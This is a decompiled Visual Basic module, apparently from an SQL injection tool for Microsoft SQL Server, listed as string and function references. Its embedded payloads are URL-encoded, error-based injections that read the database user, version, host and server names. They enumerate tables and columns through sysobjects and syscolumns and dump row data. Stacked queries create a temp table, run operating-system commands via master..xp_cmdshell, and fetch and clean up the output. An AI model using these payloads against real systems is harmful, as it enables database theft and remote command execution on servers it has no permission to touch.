Attribute VB_Name = "ASE"
' This code module rebuilt by VBRezQ v3.3a.  2-Feb-2012 / 19:56:35
Option Explicit 
 
'Sub Subr_728()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCat
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "user"
'N  * ref: __vbaStrMove
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "Current User: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Current User: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "@@version"
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "Sql Version: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Sql Version: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: Subr_726
'N  * ref: __vbaFreeVar
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "system_user"
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "System User: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "System User: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "host_name()"
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "Host Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Host Name: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "@@SERVERNAME"
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "Server Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Server Name: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_727
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_729()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "xtype="
'N  * ref: "U"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_725
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "name"
'N  * ref: "sysobjects"
'N  * ref: Subr_731
'N  * ref: __vbaI2Var
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "U"
'N  * ref: Subr_725
'N  * ref: "(select distinct TOP 1 char(126)%2bchar(39)%2b(name)%2bchar(39)%2bchar(126) from "
'N  * ref: "sysobjects where id=(select TOP 1 id from (select distinct TOP "
'N  * ref: " id from "
'N  * ref: "sysobjects where xtype="
'N  * ref: " order BY id ASC) sq order BY id DESC))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "U"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_725
'N  * ref: "(select distinct TOP 1 char(126)%2bchar(39)%2b(name)%2bchar(39)%2bchar(126) from "
'N  * ref: "sysobjects where id=(select TOP 1 id from (select distinct TOP "
'N  * ref: " id from "
'N  * ref: "sysobjects where xtype="
'N  * ref: " order BY id ASC) sq order BY id DESC))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: "Failed to get table no. "
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "TEMP"
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_730()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCat
'N  * ref: "id=(select id from "
'N  * ref: __vbaStrMove
'N  * ref: "..sysobjects where name="
'N  * ref: Subr_725
'N  * ref: __vbaVarCat
'N  * ref: ")"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "name"
'N  * ref: __vbaStrCopy
'N  * ref: "syscolumns"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_731
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_725
'N  * ref: "(select distinct TOP 1 char(126)%2bchar(39)%2b(name)%2bchar(39)%2bchar(126) from "
'N  * ref: "syscolumns where id=(select id from "
'N  * ref: "sysobjects where name="
'N  * ref: "))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarMove
'N  * ref: "Column found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarSetObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarLateMemSt
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarLateMemStAd
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_725
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_725
'N  * ref: "sysobjects where name="
'N  * ref: "(select distinct TOP 1 char(126)%2bchar(39)%2b(name)%2bchar(39)%2bchar(126) from "
'N  * ref: "syscolumns where id=(select id from "
'N  * ref: ")  and name not in (select distinct top "
'N  * ref: " name from "
'N  * ref: "syscolumns where id=(select top 1 id from "
'N  * ref: ")))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: "Column found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarSetObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarLateMemSt
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_731()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCat
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(select TOP 1 char(126)%2bchar(39)%2b("
'N  * ref: "count("
'N  * ref: __vbaStrMove
'N  * ref: ")"
'N  * ref: ")%2bchar(39)%2bchar(126) from "
'N  * ref: ".."
'N  * ref: ")"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "Count("
'N  * ref: ") of "
'N  * ref: ".."
'N  * ref: " is "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "Can not get Count("
'N  * ref: ") of "
'N  * ref: ".."
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_732()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarIndexLoad
'N  * ref: "("
'N  * ref: ")"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: IIf(
'N  * ref: __vbaAryUnlock
'N  * ref: "%2bchar(94)%2b"
'N  * ref: __vbaFreeVarList
'N  * ref: ","
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaStrCmp
'N  * ref: IsArray(
'N  * ref: ".."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(char(126)%2bchar(39)%2b(select TOP 1 "
'N  * ref: " from (select TOP "
'N  * ref: " "
'N  * ref: " from "
'N  * ref: " order by 1 asc) sq order by 1 desc)%2bchar(39)%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: ".."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(select TOP 1 "
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: __vbaStrMove
'N  * ref: ")"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "%2bchar(39)%2bchar(126) from (select TOP "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrI4
'N  * ref: __vbaStrCat
'N  * ref: " "
'N  * ref: __vbaStrCat
'N  * ref: " from "
'N  * ref: " order by 1 asc) sq order by 1 desc)"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaStrCmp
'N  * ref: "~'(.*?)'~"
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_188
'N  * ref: "Data Found: "
'N  * ref: "="
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_733()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "Creating temp table"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarCat
'N  * ref: "; CREATE TABLE r3dm0v3_sql (tmp1 varchar(8000),tmp2 varchar(8000))--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: "Creating temp table successful"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Creating temp table failed"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Executing and dumping results into temp table"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: "; insert into r3dm0v3_sql (tmp1) exec master..xp_cmdshell '"
'N  * ref: "'--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: "Executing and dumping successful"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Executing and dumping failed"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Merging results"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: "; begin declare @ret varchar(8000) set @ret='' select @ret=@ret%2b'~'%2btmp1 from r3dm0v3_sql where tmp1>@ret insert into r3dm0v3_sql(tmp2) select @ret end--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: "Merging results successful"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Merging results failed"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Fetching results"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "(select TOP 1 "
'N  * ref: "char(126)%2bchar(39)%2b(tmp2 as varchar(8000))"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "%2bchar(39)%2bchar(126) from r3dm0v3_sql where tmp2<>'')"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "~'(.*?)'~"
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: "Results received ("
'N  * ref: " bytes)"
'N  * ref: __vbaLenVar
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Mid(
'N  * ref: vbCrLf
'N  * ref: "~"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: "Removing temp table"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: "; drop table r3dm0v3_sql--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: "Removing temp table successful"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Removing temp table failed"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_734()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: Subr_735
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: Trim(
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "select"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: __vbaVarCopy
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "(char(126)%2bchar(39)%2b("
'N  * ref: __vbaStrCat
'N  * ref: ")%2bchar(39)%2bchar(126))"
'N  * ref: __vbaStrCat
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "~'(.*?)'~"
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: "Query result: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarCat
'N  * ref: ";"
'N  * ref: "--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: "Query was done"
'N  * ref: __vbaVarCopy
'N  * ref: "Query failed! (maybe its done?! check it yourself)"
'N  * ref: __vbaVarCopy
'N  * ref: Subr_143
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_735()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCopy
'N  * ref: Asc(
'N  * ref: """"
'N  * ref: "'"
'N  * ref: "'"
'N  * ref: """"
'N  * ref: __vbaVarForInit
'N  * ref: __vbaI4Var
'N  * ref: Chr(
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: Chr(
'N  * ref: __vbaInStrVar
'N  * ref: __vbaFreeVar
'N  * ref: Chr(
'N  * ref: __vbaVarAdd
'N  * ref: __vbaInStrVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarAdd
'N  * ref: Mid(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: Mid(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Subr_725
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarForNext
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
